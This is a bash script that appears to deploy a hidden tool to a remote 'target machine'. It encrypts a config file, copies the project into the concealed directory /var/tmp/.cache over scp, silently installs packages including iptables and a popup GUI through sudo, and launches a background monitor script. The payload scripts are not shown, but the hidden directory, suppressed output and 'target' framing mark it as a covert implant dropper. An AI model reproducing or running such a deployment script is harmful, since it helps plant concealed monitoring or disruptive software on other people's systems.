#!/bin/bash

TARGET_MACHINE="username@target_ip_address" # <---- replace with target credentials.
TARGET_DIR="/var/tmp/.cache"
LOCAL_DIR="$(pwd)"
CONFIG_FILE="garbage/scooby_snacks.conf"
ENCRYPTED_CONFIG_FILE="garbage/scooby_snacks.conf.enc"
PASSWORD="your_password" # <---- replace with your encryption password

if [ -f "$LOCAL_DIR/$CONFIG_FILE" ]; then
    echo "[*] Encrypting the configuration file..."
    openssl enc -aes-256-cbc -salt -in "$LOCAL_DIR/$CONFIG_FILE" -out "$LOCAL_DIR/$ENCRYPTED_CONFIG_FILE" -k "$PASSWORD"
    if [ $? -eq 0 ]; then
        echo "[*] Encryption successful."
    else
        echo "[!] Encryption failed."
        exit 1
    fi
else
    echo "[!] Configuration file not found: $CONFIG_FILE"
    exit 1
fi

echo "[*] Transferring files to the target machine..."
scp -r $LOCAL_DIR $TARGET_MACHINE:$TARGET_DIR > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "[*] File transfer successful."
else
    echo "[!] File transfer failed."
    exit 1
fi

ssh $TARGET_MACHINE << 'ENDSSH'

cd /var/tmp/.cache

echo "[*] Installing dependencies..."
sudo apt-get update > /dev/null 2>&1
sudo apt-get install -y python3 python3-pip python3-tk python3-pil python3-pil.imagetk openssl x11-xserver-utils iptables > /dev/null 2>&1

# Install Python dependencies from requirements.txt
pip3 install -r requirements.txt > /dev/null 2>&1

chmod +x actions/*.sh
chmod +x monitor/*.sh
chmod +x gui/popup.py

echo "[*] Running the main.sh script..."
./monitor/main.sh & > /dev/null 2>&1

ENDSSH

echo "[*] Deployment complete."
